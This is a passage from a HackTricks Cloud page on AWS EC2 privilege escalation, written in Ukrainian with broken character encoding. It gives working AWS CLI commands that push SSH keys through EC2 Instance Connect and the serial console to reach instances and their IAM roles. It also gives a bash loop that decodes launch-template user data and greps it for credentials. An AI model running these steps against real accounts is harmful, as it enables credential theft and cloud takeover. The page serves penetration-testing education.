–ó–ª–æ–≤–º–∏—Å–Ω–∏–∫ –∑ –¥–æ–∑–≤–æ–ª–æ–º **`ec2-instance-connect:SendSSHPublicKey`** –º–æ–∂–µ –¥–æ–¥–∞—Ç–∏ ssh –∫–ª—é—á –¥–æ –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á–∞ —ñ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–≤–∞—Ç–∏ –π–æ–≥–æ –¥–ª—è –¥–æ—Å—Ç—É–ø—É (—è–∫—â–æ —É –Ω—å–æ–≥–æ —î ssh –¥–æ—Å—Ç—É–ø –¥–æ –µ–∫–∑–µ–º–ø–ª—è—Ä–∞) –∞–±–æ –¥–ª—è –ø—ñ–¥–≤–∏—â–µ–Ω–Ω—è –ø—Ä–∏–≤—ñ–ª–µ—ó–≤.
```bash
aws ec2-instance-connect send-ssh-public-key \
--instance-id "$INSTANCE_ID" \
--instance-os-user "ec2-user" \
--ssh-public-key "file://$PUBK_PATH"
```
**–ü–æ—Ç–µ–Ω—Ü—ñ–π–Ω–∏–π –≤–ø–ª–∏–≤:** –ü—Ä—è–º–µ –ø—ñ–¥–≤–∏—â–µ–Ω–Ω—è –ø—Ä–∏–≤—ñ–ª–µ—ó–≤ –¥–æ IAM —Ä–æ–ª–µ–π EC2, –ø—Ä–∏–∫—Ä—ñ–ø–ª–µ–Ω–∏—Ö –¥–æ –∑–∞–ø—É—â–µ–Ω–∏—Ö –µ–∫–∑–µ–º–ø–ª—è—Ä—ñ–≤.

### `ec2-instance-connect:SendSerialConsoleSSHPublicKey`

–ó–ª–æ–≤–º–∏—Å–Ω–∏–∫ –∑ –¥–æ–∑–≤–æ–ª–æ–º **`ec2-instance-connect:SendSerialConsoleSSHPublicKey`** –º–æ–∂–µ **–¥–æ–¥–∞—Ç–∏ ssh –∫–ª—é—á –¥–æ —Å–µ—Ä—ñ–π–Ω–æ–≥–æ –∑'—î–¥–Ω–∞–Ω–Ω—è**. –Ø–∫—â–æ —Å–µ—Ä—ñ–π–Ω–µ –∑'—î–¥–Ω–∞–Ω–Ω—è –Ω–µ –∞–∫—Ç–∏–≤–æ–≤–∞–Ω–µ, –∑–ª–æ–≤–º–∏—Å–Ω–∏–∫—É –ø–æ—Ç—Ä—ñ–±–µ–Ω –¥–æ–∑–≤—ñ–ª **`ec2:EnableSerialConsoleAccess`, —â–æ–± –∞–∫—Ç–∏–≤—É–≤–∞—Ç–∏ –π–æ–≥–æ**.

–©–æ–± –ø—ñ–¥–∫–ª—é—á–∏—Ç–∏—Å—è –¥–æ —Å–µ—Ä—ñ–π–Ω–æ–≥–æ –ø–æ—Ä—Ç—É, –≤–∞–º —Ç–∞–∫–æ–∂ **–ø–æ—Ç—Ä—ñ–±–Ω–æ –∑–Ω–∞—Ç–∏ —ñ–º'—è –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á–∞ —Ç–∞ –ø–∞—Ä–æ–ª—å –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á–∞** –≤—Å–µ—Ä–µ–¥–∏–Ω—ñ –º–∞—à–∏–Ω–∏.

{% code overflow="wrap" %}
```bash
aws ec2 enable-serial-console-access

aws ec2-instance-connect send-serial-console-ssh-public-key \
--instance-id "$INSTANCE_ID" \
--serial-port 0 \
--region "eu-west-1" \
--ssh-public-key "file://$PUBK_PATH"

ssh -i /tmp/priv $INSTANCE_ID.port0@serial-console.ec2-instance-connect.eu-west-1.aws
```
{% endcode %}

–¶–µ–π —Å–ø–æ—Å—ñ–± –Ω–µ —î –æ—Å–æ–±–ª–∏–≤–æ –∫–æ—Ä–∏—Å–Ω–∏–º –¥–ª—è –ø—ñ–¥–≤–∏—â–µ–Ω–Ω—è –ø—Ä–∏–≤—ñ–ª–µ—ó–≤, –æ—Å–∫—ñ–ª—å–∫–∏ –≤–∞–º –ø–æ—Ç—Ä—ñ–±–Ω–æ –∑–Ω–∞—Ç–∏ —ñ–º'—è –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á–∞ —Ç–∞ –ø–∞—Ä–æ–ª—å, —â–æ–± –π–æ–≥–æ –µ–∫—Å–ø–ª—É–∞—Ç—É–≤–∞—Ç–∏.

**–ü–æ—Ç–µ–Ω—Ü—ñ–π–Ω–∏–π –≤–ø–ª–∏–≤:** (–í–∏—Å–æ–∫–æ –Ω–µ–ø–µ—Ä–µ–≤—ñ—Ä–µ–Ω–∏–π) –ü—Ä—è–º–µ –ø—ñ–¥–≤–∏—â–µ–Ω–Ω—è –ø—Ä–∏–≤—ñ–ª–µ—ó–≤ –¥–æ EC2 IAM —Ä–æ–ª–µ–π, –ø—Ä–∏–∫—Ä—ñ–ø–ª–µ–Ω–∏—Ö –¥–æ –∑–∞–ø—É—â–µ–Ω–∏—Ö –µ–∫–∑–µ–º–ø–ª—è—Ä—ñ–≤.

### `describe-launch-templates`,`describe-launch-template-versions`

–û—Å–∫—ñ–ª—å–∫–∏ —à–∞–±–ª–æ–Ω–∏ –∑–∞–ø—É—Å–∫—É –º–∞—é—Ç—å –≤–µ—Ä—Å—ñ—ó, –∑–ª–æ–≤–º–∏—Å–Ω–∏–∫ –∑ –ø—Ä–∞–≤–∞–º–∏ **`ec2:describe-launch-templates`** —Ç–∞ **`ec2:describe-launch-template-versions`** –º–æ–∂–µ –≤–∏–∫–æ—Ä–∏—Å—Ç–∞—Ç–∏ —ó—Ö –¥–ª—è –≤–∏—è–≤–ª–µ–Ω–Ω—è —á—É—Ç–ª–∏–≤–æ—ó —ñ–Ω—Ñ–æ—Ä–º–∞—Ü—ñ—ó, —Ç–∞–∫–æ—ó —è–∫ –æ–±–ª—ñ–∫–æ–≤—ñ –¥–∞–Ω—ñ, –ø—Ä–∏—Å—É—Ç–Ω—ñ –≤ –¥–∞–Ω–∏—Ö –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á–∞. –î–ª—è —Ü—å–æ–≥–æ –Ω–∞—Å—Ç—É–ø–Ω–∏–π —Å–∫—Ä–∏–ø—Ç –ø—Ä–æ—Ö–æ–¥–∏—Ç—å —á–µ—Ä–µ–∑ –≤—Å—ñ –≤–µ—Ä—Å—ñ—ó –¥–æ—Å—Ç—É–ø–Ω–∏—Ö —à–∞–±–ª–æ–Ω—ñ–≤ –∑–∞–ø—É—Å–∫—É:

{% code overflow="wrap" %}
```bash
for i in $(aws ec2 describe-launch-templates --region us-east-1 | jq -r '.LaunchTemplates[].LaunchTemplateId')
do
echo "[*] Analyzing $i"
aws ec2 describe-launch-template-versions --launch-template-id $i --region us-east-1 | jq -r '.LaunchTemplateVersions[] | "\(.VersionNumber) \(.LaunchTemplateData.UserData)"' | while read version userdata
do
echo "VersionNumber: $version"
echo "$userdata" | base64 -d
echo
done | grep -iE "aws_|password|token|api"
done
```
{% endcode %}

–£ –Ω–∞–≤–µ–¥–µ–Ω–∏—Ö –∫–æ–º–∞–Ω–¥–∞—Ö, —Ö–æ—á–∞ –º–∏ –≤–∫–∞–∑—É—î–º–æ –ø–µ–≤–Ω—ñ —à–∞–±–ª–æ–Ω–∏ (`aws_|password|token|api`), –≤–∏ –º–æ–∂–µ—Ç–µ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–≤–∞—Ç–∏ —ñ–Ω—à–∏–π regex –¥–ª—è –ø–æ—à—É–∫—É —ñ–Ω—à–∏—Ö —Ç–∏–ø—ñ–≤ —á—É—Ç–ª–∏–≤–æ—ó —ñ–Ω—Ñ–æ—Ä–º–∞—Ü—ñ—ó.

–ü—Ä–∏–ø—É—Å—Ç–∏–º–æ, –º–∏ –∑–Ω–∞—Ö–æ–¥–∏–º–æ `aws_access_key_id` —Ç–∞ `aws_secret_access_key`, –º–∏ –º–æ–∂–µ–º–æ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–≤–∞—Ç–∏ —Ü—ñ –æ–±–ª—ñ–∫–æ–≤—ñ –¥–∞–Ω—ñ –¥–ª—è –∞–≤—Ç–µ–Ω—Ç–∏—Ñ—ñ–∫–∞—Ü—ñ—ó –≤ AWS.

**–ü–æ—Ç–µ–Ω—Ü—ñ–π–Ω–∏–π –≤–ø–ª–∏–≤:** –ü—Ä—è–º–µ –ø—ñ–¥–≤–∏—â–µ–Ω–Ω—è –ø—Ä–∏–≤—ñ–ª–µ—ó–≤ –¥–æ IAM –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á–∞(—ñ–≤).

## –ü–æ—Å–∏–ª–∞–Ω–Ω—è

* [https://rhinosecuritylabs.com/aws/aws-privilege-escalation-methods-mitigation/](https://rhinosecuritylabs.com/aws/aws-privilege-escalation-methods-mitigation/)

{% hint style="success" %}
–í—á—ñ—Ç—å—Å—è —Ç–∞ –ø—Ä–∞–∫—Ç–∏–∫—É–π—Ç–µ AWS Hacking:<img src="../../../.gitbook/assets/image (1).png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../../.gitbook/assets/image (1).png" alt="" data-size="line">\
–í—á—ñ—Ç—å—Å—è —Ç–∞ –ø—Ä–∞–∫—Ç–∏–∫—É–π—Ç–µ GCP Hacking: <img src="../../../.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../../.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>–ü—ñ–¥—Ç—Ä–∏–º–∞—Ç–∏ HackTricks</summary>

* –ü–µ—Ä–µ–≤—ñ—Ä—Ç–µ [**–ø–ª–∞–Ω–∏ –ø—ñ–¥–ø–∏—Å–∫–∏**](https://github.com/sponsors/carlospolop)!
* **–ü—Ä–∏—î–¥–Ω—É–π—Ç–µ—Å—å –¥–æ** üí¨ [**–≥—Ä—É–ø–∏ Discord**](https://discord.gg/hRep4RUj7f) –∞–±–æ [**–≥—Ä—É–ø–∏ telegram**](https://t.me/peass) –∞–±–æ **—Å–ª—ñ–¥–∫—É–π—Ç–µ** –∑–∞ –Ω–∞–º–∏ –≤ **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **–î—ñ–ª—ñ—Ç—å—Å—è —Ö–∞–∫–µ—Ä—Å—å–∫–∏–º–∏ —Ç—Ä—é–∫–∞–º–∏, –ø–æ–¥–∞—é—á–∏ PR –¥–æ** [**HackTricks**](https://github.com/carlospolop/hacktricks) —Ç–∞ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) —Ä–µ–ø–æ–∑–∏—Ç–æ—Ä—ñ—ó–≤ –Ω–∞ github.

</details>
{% endhint %}
